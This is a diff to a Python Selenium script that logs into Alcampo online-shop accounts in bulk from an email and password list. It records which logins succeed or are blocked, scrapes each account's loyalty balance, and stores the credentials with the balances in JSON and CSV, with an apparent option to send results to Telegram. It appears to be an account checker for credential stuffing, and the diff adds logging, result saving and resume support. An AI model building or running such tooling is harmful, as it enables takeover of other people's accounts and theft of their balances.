@@ -33,8 +33,69 @@ sys.stderr.reconfigure(encoding='utf-8')
 ROOT = Path(__file__).resolve().parent
 ACCOUNTS_FILE = ROOT / "accounts.json"
 EXCEL_FILE = ROOT / "saldos_alcampo.xlsx"
+RESULTS_JSON_FILE = ROOT / "results.json"
+RESULTS_CSV_FILE = ROOT / "results.csv"
 
 log_lock = threading.Lock()
+results_lock = threading.Lock()
+
+
+def mask_email(email_str):
+    if not email_str or "@" not in email_str:
+        return email_str or ""
+    parts = email_str.split("@", 1)
+    user, domain = parts[0], parts[1]
+    if len(user) <= 2:
+        masked_user = user[0] + "*"
+    else:
+        masked_user = user[:2] + "*" * (len(user) - 2)
+    return f"{masked_user}@{domain}"
+
+
+def log_msg(thread_idx, email, step, status="", error=""):
+    now_str = time.strftime("%Y-%m-%d %H:%M:%S")
+    masked = mask_email(email)
+    msg_parts = [f"[{now_str}]", f"[Hilo {thread_idx}]", f"[{masked}]", f"Paso: {step}"]
+    if status:
+        msg_parts.append(f"Estado: {status}")
+    if error:
+        msg_parts.append(f"Detalle: {error}")
+    with log_lock:
+        print(" | ".join(msg_parts))
+
+
+def save_account_result(result_item):
+    with results_lock:
+        # 1. Update results.json atomically
+        all_results = []
+        if RESULTS_JSON_FILE.exists():
+            try:
+                with open(RESULTS_JSON_FILE, "r", encoding="utf-8") as f:
+                    all_results = json.load(f)
+                    if not isinstance(all_results, list):
+                        all_results = []
+            except Exception:
+                all_results = []
+        # Replace if email already in results or append
+        existing_idx = next((i for i, r in enumerate(all_results) if r.get("email") == result_item.get("email")), None)
+        if existing_idx is not None:
+            all_results[existing_idx] = result_item
+        else:
+            all_results.append(result_item)
+        temp_json = RESULTS_JSON_FILE.with_suffix(".tmp")
+        with open(temp_json, "w", encoding="utf-8") as f:
+            json.dump(all_results, f, indent=2, ensure_ascii=False)
+        temp_json.replace(RESULTS_JSON_FILE)
+
+        # 2. Update results.csv
+        try:
+            df = pd.DataFrame(all_results)
+            temp_csv = RESULTS_CSV_FILE.with_suffix(".tmp")
+            df.to_csv(temp_csv, index=False, encoding="utf-8")
+            temp_csv.replace(RESULTS_CSV_FILE)
+        except Exception:
+            pass
+
 
 # Install ChromeDriver once
 try:
@@ -155,10 +216,11 @@ def cargar_cuentas_desde_archivo(filepath=None):
 def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
     email = acc["email"]
     password = acc["password"]
-    print(f"[Hilo {thread_idx}] → Procesando ({current_idx}/{total_accs}): {email}")
+    log_msg(thread_idx, email, f"Inicio ({current_idx}/{total_accs})", "Procesando")
     
     driver = None
     saldo = "Error: Desconocido"
+    res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
     try:
         chrome_options = Options()
         chrome_options.add_argument("--headless=new")
@@ -173,6 +235,7 @@ def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
         driver.implicitly_wait(1)
 
         # 1. Login
+        log_msg(thread_idx, email, "Navegando a login", "En progreso")
         driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
         wait = WebDriverWait(driver, 15)
         
@@ -191,6 +254,7 @@ def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
         password_field.clear()
         password_field.send_keys(password)
         
+        log_msg(thread_idx, email, "Enviando credenciales", "Enviando")
         # Enviar formulario mediante botón de Salesforce authorization o ENTER
         submit_btn = driver.find_elements(By.ID, "btnSubmit_login")
         if submit_btn:
@@ -198,29 +262,50 @@ def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
         else:
             password_field.send_keys(Keys.ENTER)
 
-        # 2. Esperar redirección fuera del login y de autorización
+        # 2. Esperar redirección fuera del login y de autorización (máximo 15 s)
         try:
             WebDriverWait(driver, 15).until(
-                lambda d: ("compraonline.alcampo.es" in d.current_url and "login" not in d.current_url and "authorization" not in d.current_url) or "call center" in d.page_source.lower() or "bloqueada" in d.page_source.lower() or "incorrect" in d.page_source.lower()
+                lambda d: ("compraonline.alcampo.es" in d.current_url and "login" not in d.current_url and "authorization" not in d.current_url) or any(m.text.strip() for m in d.find_elements(By.CSS_SELECTOR, ".modal.show, .modal-body, #errorNotifyBlockWarning"))
             )
         except Exception:
             pass
 
-        page_src = driver.page_source.lower()
         curr_url = driver.current_url.lower()
 
-        # Detección de errores específicos
-        if "call center" in page_src or "bloqueada" in page_src or "913 687 857" in page_src:
-            saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
-            print(f"[Hilo {thread_idx}] 🔴 {email} → {saldo}")
-            return {"email": email, "password": password, "saldo": saldo}
+        # Si ya estamos dentro del portal de compraonline, el login fue 100% exitoso
+        if "compraonline.alcampo.es" in curr_url and "login" not in curr_url and "authorization" not in curr_url:
+            pass  # Login OK -> Continuar directo a extraer saldo
+        else:
+            # Sigue en la pantalla de autorización o modal: extraer error real del modal visible
+            modal_text = ""
+            for modal_el in driver.find_elements(By.CSS_SELECTOR, ".modal.show, .modal-body, #errorNotifyBlockWarning, .alert-danger"):
+                txt = modal_el.text.strip().lower()
+                if txt:
+                    modal_text += " " + txt
 
-        if "incorrect" in page_src or "credenciales" in page_src or "authorization" in curr_url or "my.site.com" in curr_url:
+            if "bloqueada" in modal_text or "cuenta ha sido bloqueada" in modal_text:
+                saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
+                log_msg(thread_idx, email, "Resultado login", "BLOQUEADA", saldo)
+                res_dict = {"email": email, "password": password, "saldo": saldo, "status": "BLOQUEADA"}
+                save_account_result(res_dict)
+                return res_dict
+
+            if "incorrect" in modal_text or "credenciales" in modal_text or "call center" in modal_text or "913 687 857" in modal_text:
+                saldo = "Error: Credenciales incorrectas"
+                log_msg(thread_idx, email, "Resultado login", "ERROR", saldo)
+                res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
+                save_account_result(res_dict)
+                return res_dict
+
+            # Si sigue en authorization sin modal visible
             saldo = "Error: Credenciales incorrectas o bloqueo"
-            print(f"[Hilo {thread_idx}] ⚠️ {email} → {saldo}")
-            return {"email": email, "password": password, "saldo": saldo}
+            log_msg(thread_idx, email, "Resultado login", "ERROR", saldo)
+            res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
+            save_account_result(res_dict)
+            return res_dict
 
         # 3. Navegación a settings/loyalty para extraer saldo directamente con DOM
+        log_msg(thread_idx, email, "Consultando saldo en /settings/loyalty", "Navegando")
         driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
         time.sleep(3.5)
         page_html = driver.page_source
@@ -241,11 +326,15 @@ def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
                 else:
                     saldo = "Saldo: 0.00 € (o no disponible)"
 
-        print(f"[Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
+        log_msg(thread_idx, email, "Extracción de saldo", "OK", saldo)
+        res_dict = {"email": email, "password": password, "saldo": saldo, "status": "OK"}
+        save_account_result(res_dict)
 
     except Exception as e:
         saldo = f"Error: {str(e)[:60]}"
-        print(f"[Hilo {thread_idx}] ❌ {email} → {saldo}")
+        log_msg(thread_idx, email, "Excepción en proceso", "ERROR", saldo)
+        res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
+        save_account_result(res_dict)
     finally:
         if driver:
             try:
@@ -253,7 +342,7 @@ def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
             except Exception:
                 pass
 
-    return {"email": email, "password": password, "saldo": saldo}
+    return res_dict
 
 
 def parse_args():
@@ -262,6 +351,7 @@ def parse_args():
     parser.add_argument("--input-file", type=str, default=None, help="Ruta al archivo de cuentas")
     parser.add_argument("--threads", type=int, default=2, help="Hilos concurrentes (default: 2)")
     parser.add_argument("--limit", type=int, default=None, help="Límite de cuentas a procesar")
+    parser.add_argument("--resume", action="store_true", help="Reanudar y saltar cuentas ya procesadas con éxito/OK")
     parser.add_argument("--no-telegram", action="store_true", help="Desactivar envío a Telegram")
     parser.add_argument("--send-telegram", action="store_true", default=True, help="Activar envío a Telegram")
     args = parser.parse_args()
@@ -274,6 +364,21 @@ def main():
     args = parse_args()
     accounts = cargar_cuentas_desde_archivo(args.input_file)
     
+    if args.resume and RESULTS_JSON_FILE.exists():
+        try:
+            with open(RESULTS_JSON_FILE, "r", encoding="utf-8") as f:
+                prev_data = json.load(f)
+                if isinstance(prev_data, list):
+                    done_ok_emails = {
+                        item.get("email") for item in prev_data
+                        if item.get("status") in ["OK", "BLOQUEADA"] or "Tu Saldo es" in str(item.get("saldo", ""))
+                    }
+                    total_before = len(accounts)
+                    accounts = [acc for acc in accounts if acc.get("email") not in done_ok_emails]
+                    print(f"🔄 Modo --resume activado: Se omiten {total_before - len(accounts)} cuentas ya procesadas previamente. Restantes: {len(accounts)}")
+        except Exception as e:
+            print(f"⚠️ Error al leer historial para --resume: {e}")
+
     if args.limit:
         accounts = accounts[:args.limit]
         print(f"ℹ️ Modo prueba: Limitado a {args.limit} cuentas.")
